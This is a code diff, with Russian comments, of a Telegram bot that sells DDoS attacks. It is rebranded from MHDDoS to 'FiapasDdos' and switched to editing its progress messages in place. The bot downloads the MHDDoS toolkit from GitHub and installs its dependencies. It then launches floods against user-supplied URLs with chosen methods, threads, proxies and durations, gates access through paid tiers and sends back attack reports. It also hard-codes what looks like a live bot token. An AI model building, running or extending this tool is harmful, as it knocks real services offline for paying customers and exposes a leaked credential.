@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-MHDDoS БОТ — ФИНАЛЬНАЯ ВЕРСИЯ (все зависимости, PyRoxy через ZIP)
+FiapasDdos БОТ — УПРАВЛЕНИЕ АТАКАМИ (ПРОГРЕСС РЕДАКТИРУЕТСЯ)
 """
 
 import asyncio
@@ -31,7 +31,8 @@ from aiohttp import web
 BOT_TOKEN = "8984259381:AAHAc-dorORjD-G0Ci2lLnwf_kbbzqqCxkg"
 ADMINS = [8264264137]
 
-MH_DDOS_PATH = "start.py"
+# Путь к start.py (FiapasDdos)
+DDOS_SCRIPT = "start.py"
 PROXIES_FILE = "proxies.txt"
 DATA_FILE = "users.json"
 UA_FILE = "user_agents.txt"
@@ -39,12 +40,19 @@ UA_FILE = "user_agents.txt"
 WEBHOOK_URL = "https://llosdfisojdfouisdf-production.up.railway.app/webhook"
 
 # ==============================
-# АВТОЗАГРУЗКА MHDDOS И УСТАНОВКА ЗАВИСИМОСТЕЙ
+# ГЛОБАЛЬНЫЙ ОБЪЕКТ БОТА
 # ==============================
-def ensure_mhddos():
-    if os.path.exists(MH_DDOS_PATH):
+bot = Bot(token=BOT_TOKEN, connect_timeout=120, read_timeout=120)
+dp = Dispatcher()
+user_data = {}
+
+# ==============================
+# АВТОЗАГРУЗКА FiapasDdos И УСТАНОВКА ВСЕХ ЗАВИСИМОСТЕЙ
+# ==============================
+def ensure_ddos_script():
+    if os.path.exists(DDOS_SCRIPT):
         return
-    print("⬇️ MHDDoS не найден, скачиваю...")
+    print("⬇️ FiapasDdos не найден, скачиваю...")
     url = "https://github.com/MatrixTM/MHDDoS/archive/refs/heads/main.zip"
     try:
         r = requests.get(url, timeout=30)
@@ -58,14 +66,14 @@ def ensure_mhddos():
                         data = z.read(file)
                         with open(new_name, "wb") as f:
                             f.write(data)
-            print("✅ MHDDoS загружен и распакован.")
-            install_all_dependencies()
+            print("✅ FiapasDdos загружен и распакован.")
+            install_dependencies()
         else:
-            print(f"❌ Не удалось скачать MHDDoS, статус {r.status_code}")
+            print(f"❌ Не удалось скачать FiapasDdos, статус {r.status_code}")
     except Exception as e:
         print(f"❌ Ошибка загрузки: {e}")
 
-def install_all_dependencies():
+def install_dependencies():
     packages = [
         "cloudscraper==1.2.71",
         "certifi==2024.7.4",
@@ -90,7 +98,7 @@ def install_all_dependencies():
         except Exception as e:
             print(f"⚠️ Не удалось установить {pkg}: {e}")
 
-ensure_mhddos()
+ensure_ddos_script()
 
 # ==============================
 # USER-AGENT
@@ -233,14 +241,14 @@ active_attacks = {}
 
 async def run_attack(user_id, method, url, threads, duration):
     update_proxies()
-    if not os.path.exists(MH_DDOS_PATH):
-        await asyncio.get_event_loop().run_in_executor(None, ensure_mhddos)
-        if not os.path.exists(MH_DDOS_PATH):
-            raise Exception("MHDDoS не найден")
+    if not os.path.exists(DDOS_SCRIPT):
+        await asyncio.get_event_loop().run_in_executor(None, ensure_ddos_script)
+        if not os.path.exists(DDOS_SCRIPT):
+            raise Exception("FiapasDdos не найден")
     if not os.path.exists(PROXIES_FILE):
         open(PROXIES_FILE, 'a').close()
     
-    # Проверяем установку PyRoxy (основная зависимость)
+    # Проверяем PyRoxy
     try:
         import PyRoxy
     except ImportError:
@@ -255,7 +263,7 @@ async def run_attack(user_id, method, url, threads, duration):
         except Exception as e:
             raise Exception(f"Не удалось установить PyRoxy: {e}")
     
-    cmd = ["python", MH_DDOS_PATH, method, url, "0", str(threads), PROXIES_FILE, "64", str(duration)]
+    cmd = ["python", DDOS_SCRIPT, method, url, "0", str(threads), PROXIES_FILE, "64", str(duration)]
     process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=os.path.dirname(os.path.abspath(__file__)))
     return process
 
@@ -283,7 +291,7 @@ async def safe_answer(callback, text=None, show_alert=False):
             raise
 
 # ==============================
-# КЛАВИАТУРЫ
+# КЛАВИАТУРЫ (Inline)
 # ==============================
 def main_menu():
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -428,7 +436,7 @@ def confirm_menu():
     ])
 
 # ==============================
-# ОТПРАВКА СООБЩЕНИЙ
+# ОТПРАВКА СООБЩЕНИЙ (без редактирования, только для старта)
 # ==============================
 async def send_new(message, text, parse_mode="HTML", reply_markup=None):
     try:
@@ -452,18 +460,11 @@ def generate_report(method, url, threads, duration, elapsed, output):
   Длительность: {duration} сек
   Время выполнения: {elapsed:.2f} сек
 ───────────────────────────────────────────────
-  ВЫВОД MHDDoS:
+  ВЫВОД FiapasDdos:
 {output}
 ═══════════════════════════════════════════════
 """
     return report
-
-# ==============================
-# БОТ
-# ==============================
-bot = Bot(token=BOT_TOKEN, connect_timeout=120, read_timeout=120)
-dp = Dispatcher()
-user_data = {}
 
 # ==============================
 # ОБРАБОТЧИКИ
@@ -473,7 +474,7 @@ async def start_cmd(message: types.Message):
     user = get_user(message.from_user.id)
     tier_name = TIERS[user["tier"]]["name"]
     await message.answer(
-        f"🌟 <b>MHDDoS БОТ</b>\n\n"
+        f"🌟 <b>FiapasDdos БОТ</b>\n\n"
         f"👤 Тариф: {tier_name}\n"
         f"💎 Баланс: {user['balance']} ⭐\n\n"
         f"🚀 Управляй атаками через кнопки.",
@@ -744,11 +745,13 @@ async def confirm_launch(callback: types.CallbackQuery):
             reply_markup=main_menu()
         )
         return
+    # Отправляем сообщение о загрузке (оно будет редактироваться)
     loading_msg = await callback.message.answer("🔄 Загружаю прокси... Подождите 20-40 сек.", parse_mode="HTML")
     try:
         process = await run_attack(user_id, method, url, threads, duration)
         start = time.time()
         await loading_msg.delete()
+        # Основное сообщение, которое будем редактировать
         msg = await callback.message.answer(
             f"🚀 <b>Атака запущена!</b>\n\n"
             f"🎯 Метод: {method}\n"
@@ -789,11 +792,12 @@ async def monitor_attack(user_id):
         if time.time() - last_update >= 5:
             progress = min(100, int(elapsed / duration * 100))
             try:
-                await msg.answer(
+                # Редактируем сообщение вместо отправки нового
+                await msg.edit_text(
                     f"🚀 <b>Атака выполняется</b>\n\n"
-                    f"🎯 {html.escape(data['method'])}\n"
-                    f"🌐 {html.escape(data['url'])}\n"
-                    f"🧵 {data.get('threads', '?')}\n\n"
+                    f"🎯 Метод: {html.escape(data['method'])}\n"
+                    f"🌐 URL: {html.escape(data['url'])}\n"
+                    f"🧵 Потоков: {data.get('threads', '?')}\n\n"
                     f"⏳ <b>Прогресс:</b> {progress}%\n"
                     f"⏱️ Прошло: {int(elapsed)} сек / {duration} сек\n"
                     f"⏳ Осталось: {int(remaining)} сек\n\n"
@@ -801,8 +805,8 @@ async def monitor_attack(user_id):
                     parse_mode="HTML",
                     reply_markup=main_menu()
                 )
-            except:
-                pass
+            except Exception as e:
+                print(f"Ошибка редактирования прогресса: {e}")
             last_update = time.time()
         await asyncio.sleep(1)
     stdout, stderr = process.communicate()
@@ -817,10 +821,19 @@ async def monitor_attack(user_id):
         elapsed=time.time() - start,
         output=output
     )
+    # Пытаемся отправить отчёт как файл
     filename = f"report_{user_id}_{int(time.time())}.txt"
     with open(filename, "w", encoding="utf-8") as f:
         f.write(report_text)
     try:
+        # Сначала редактируем сообщение, что атака завершена
+        await msg.edit_text(
+            f"✅ <b>Атака завершена!</b>\n\n"
+            f"📄 Отчёт приложен в виде файла.",
+            parse_mode="HTML",
+            reply_markup=main_menu()
+        )
+        # Отправляем файл
         await bot.send_document(
             chat_id=user_id,
             document=InputFile(filename),
@@ -828,9 +841,11 @@ async def monitor_attack(user_id):
             reply_markup=main_menu()
         )
     except Exception as e:
-        await bot.send_message(
-            user_id,
-            f"📄 Отчёт об атаке:\n<code>{html.escape(report_text)}</code>",
+        # Если файл не отправился, выводим текст в редактируемое сообщение
+        await msg.edit_text(
+            f"✅ <b>Атака завершена!</b>\n\n"
+            f"📄 <b>Отчёт:</b>\n"
+            f"<code>{html.escape(report_text)}</code>",
             parse_mode="HTML",
             reply_markup=main_menu()
         )
